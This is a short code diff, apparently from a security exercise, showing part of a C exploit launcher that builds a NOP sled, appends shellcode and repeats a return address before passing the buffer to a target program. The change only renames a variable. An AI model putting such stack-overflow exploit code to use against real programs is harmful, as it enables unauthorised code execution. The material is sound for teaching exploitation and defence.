@@ -17,18 +17,18 @@ main ( int argc, char * argv[] )
 	char *	args[3];
 	char *	env[1];
 	int i;
-	char attack_buffer[BUF_SIZE];
+	char attack[BUF_SIZE];
 
-    strcpy(attack_buffer, "\x90");
+    strcpy(attack, "\x90");
     for (i = 0; i < 70; i++)
-        strcat(attack_buffer, "\x90");
+        strcat(attack, "\x90");
 
-    strcat(attack_buffer, shellcode);
+    strcat(attack, shellcode);
     for (i = 0; i < 2; i++)
-        strcat(attack_buffer, "\x10\xfe\x21\x20");
+        strcat(attack, "\x10\xfe\x21\x20");
 
 	args[0] = TARGET;
-	args[1] = attack_buffer;
+	args[1] = attack;
 	args[2] = NULL;
 
 	env[0] = NULL;
